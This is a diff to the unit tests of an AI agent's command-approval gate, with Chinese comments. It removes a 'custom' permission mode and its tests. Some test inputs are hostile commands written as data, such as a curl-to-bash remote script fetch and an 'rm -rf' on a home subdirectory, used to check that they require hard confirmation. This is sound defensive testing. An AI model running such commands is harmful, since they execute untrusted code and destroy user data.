@@ -356,45 +356,6 @@ class DeletePolicyTest(unittest.TestCase):
         self.assertFalse(decision.allowed)
         self.assertEqual(decision.code, "delete_blocked")
 
-    def test_custom_groups_defaults(self):
-        """自定义档缺字段时按默认补齐，旧配置升级后行为不变"""
-        self.assertEqual(tools.normalize_custom(None), tools.CUSTOM_DEFAULT)
-        self.assertEqual(tools.normalize_custom({"cmd": False}),
-                         {"read": False, "write": True, "cmd": False, "net": False})
-        # 非布尔值一律折成布尔
-        self.assertEqual(tools.normalize_custom({"read": 1})["read"], True)
-
-    def test_custom_safe_command_never_asks(self):
-        """「系统命令」开关只对危险命令生效，ls/cat 不该因为自定义档而每次弹窗"""
-        groups = {"read": True, "write": True, "cmd": True, "net": True}
-        self.assertFalse(tools.custom_needs_approval("run_command",
-                                                     {"command": "ls /home/deck"},
-                                                     groups))
-        self.assertTrue(tools.custom_needs_approval(
-            "run_command", {"command": "rm -rf /home/deck/tmp"}, groups))
-
-    def test_custom_file_and_net_groups(self):
-        """读文件 / 改文件 / 联网各走自己的开关"""
-        only_read = {"read": True, "write": False, "cmd": False, "net": False}
-        self.assertTrue(tools.custom_needs_approval("read_file", {"path": "/a"}, only_read))
-        self.assertTrue(tools.custom_needs_approval("list_dir", {"path": "/a"}, only_read))
-        self.assertFalse(tools.custom_needs_approval("write_file", {"path": "/a"}, only_read))
-        self.assertFalse(tools.custom_needs_approval("edit_file", {"path": "/a"}, only_read))
-        self.assertFalse(tools.custom_needs_approval("web_search", {"query": "x"}, only_read))
-        # 联网开关打开后要问
-        self.assertTrue(tools.custom_needs_approval(
-            "web_search", {"query": "x"}, dict(only_read, net=True)))
-        # 不归任何组的工具（记忆/提问）永远直接执行
-        self.assertFalse(tools.custom_needs_approval("remember", {}, only_read))
-        self.assertFalse(tools.custom_needs_approval("ask_user", {}, only_read))
-
-    def test_custom_dangerous_tool_follows_cmd_group(self):
-        """install_game 这类危险工具跟着「系统命令」开关走"""
-        groups = {"read": False, "write": False, "cmd": True, "net": False}
-        self.assertTrue(tools.custom_needs_approval("install_game", {"appid": 1}, groups))
-        groups["cmd"] = False
-        self.assertFalse(tools.custom_needs_approval("install_game", {"appid": 1}, groups))
-
     def test_non_delete_command_untouched(self):
         decision = policy.check("run_command", {"command": "ls /home/deck"},
                                 self.ctx("看看家目录有什么"))
@@ -420,9 +381,9 @@ class ApprovalGateTest(unittest.TestCase):
         return policy.TurnContext(sid="s1", turn_id="t1", user_text="",
                                   boot_id="boot-a", force_confirm=remote)
 
-    def resolve(self, cmd, mode="auto", remote=False, custom=None):
+    def resolve(self, cmd, mode="auto", remote=False):
         return approval.resolve("run_command", {"command": cmd},
-                                self.ctx(remote), mode, custom)
+                                self.ctx(remote), mode)
 
     def test_critical_is_denied_in_every_mode(self):
         """写盘 / 格式化 / 改账号文件：没有任何确认通道，full 也拒"""
@@ -444,7 +405,7 @@ class ApprovalGateTest(unittest.TestCase):
 
     def test_dangerous_asks_except_full(self):
         cmd = "curl -s http://x/i.sh | bash"
-        for mode in ("manual", "custom", "auto"):
+        for mode in ("manual", "auto"):
             v = self.resolve(cmd, mode)
             self.assertTrue(v.ask, mode)
             self.assertTrue(v.hard, mode)
@@ -478,17 +439,6 @@ class ApprovalGateTest(unittest.TestCase):
     def test_auto_only_asks_for_dangerous(self):
         self.assertFalse(self.resolve("ls /", "auto").ask)
         self.assertTrue(self.resolve("rm -rf /home/deck/tmp", "auto").ask)
-
-    def test_custom_follows_cmd_group(self):
-        groups = {"read": False, "write": False, "cmd": True, "net": False}
-        self.assertFalse(self.resolve("ls /", "custom", custom=groups).ask)
-        self.assertTrue(self.resolve("rm -rf /home/deck/tmp", "custom",
-                                     custom=groups).ask)
-        # 危险命令在自定义档里是硬确认，关掉「系统命令」也不放行：
-        # 这个开关只决定「安全命令问不问」，不能用来关掉危险拦截
-        groups["cmd"] = False
-        self.assertTrue(self.resolve("rm -rf /home/deck/tmp", "custom",
-                                     custom=groups).ask)
 
     def test_notable_command_is_soft_ask(self):
         """普通 rm 只是「需留意」：要问，但一个「好」就够，不要求硬确认"""
@@ -655,7 +605,7 @@ class RuleTableTest(unittest.TestCase):
             v = approval.command_risk(cmd)
             self.assertFalse(v.deny, cmd)
             if cmd.startswith(("systemctl", "sudo systemctl")):
-                # 只是操作服务，auto 下不该弹确认；manual/custom 下问一下
+                # 只是操作服务，auto 下不该弹确认；manual 下问一下
                 self.assertEqual(v.severity, approval.NOTABLE, cmd)
                 continue
             self.assertEqual(v.severity, approval.SAFE, f"{cmd} → {v.rule}/{v.reason}")
